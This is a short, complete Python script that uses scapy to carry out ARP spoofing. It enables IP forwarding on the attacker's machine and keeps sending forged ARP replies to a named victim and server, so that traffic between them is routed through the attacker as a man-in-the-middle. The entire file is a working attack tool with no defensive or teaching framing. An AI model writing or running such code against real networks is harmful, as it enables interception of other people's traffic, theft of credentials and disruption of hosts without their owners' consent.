
from scapy.all import *
conf.verb = 0
import sys
import os
import time
import signal
#
def getMAC(ip):
	try:
		val = arping(ip)
		return val[0][0][1].src
	except:
		return 0

#Accepting IP Addresses
serverIP = sys.argv[1]
victimIP = sys.argv[2]

#Fetching MAC address of Victim and Server from IP
serverMAC = getMAC(serverIP)
if not (serverMAC):
	sys.exit("Server Machine not Found...")
victimMAC = getMAC(victimIP)
if not (victimMAC):
	sys.exit("Victim Machine not Found...")
#print victimMAC
#print serverMAC

#Enabling IP Forwarding of Attacker Machine
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")




while 1:
	#ARP for Victim with spoofed Server MAC
	send(ARP(op=2, pdst=victimIP, psrc=serverIP, hwdst=victimMAC))
	#ARP for Server with spoofed Victim MAC
	send(ARP(op=2, pdst=serverIP, psrc=victimIP, hwdst=serverMAC))
	print ("Spoofed "+victimIP+" and "+serverIP+".")
	time.sleep(1)





